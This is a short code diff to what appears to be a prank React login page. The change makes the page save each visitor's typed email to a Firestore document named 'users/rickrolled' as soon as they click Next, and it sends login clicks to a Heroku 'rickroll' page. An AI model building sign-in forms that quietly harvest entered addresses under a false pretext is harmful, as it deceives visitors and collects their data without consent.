@@ -32,14 +32,14 @@ function App() {
   }
 
   const goNext = () => {
+    updateDoc(doc(db, "users/rickrolled"), { emails: arrayUnion(email) })
+      .catch((error) => console.error("Error adding document: ", error));
     setIsNext(true);
     setTimeout(() => passwordRef.current?.focus(), 500);
   }
 
   const login = () => {
-    updateDoc(doc(db, "users/rickrolled"), { emails: arrayUnion(email) })
-      .then(() => console.log("RICK ROLLED!"))
-      .catch((error) => console.error("Error adding document: ", error));
+    window.location.href = 'https://techlab-review-3.herokuapp.com/rickroll';
   }
 
   return (
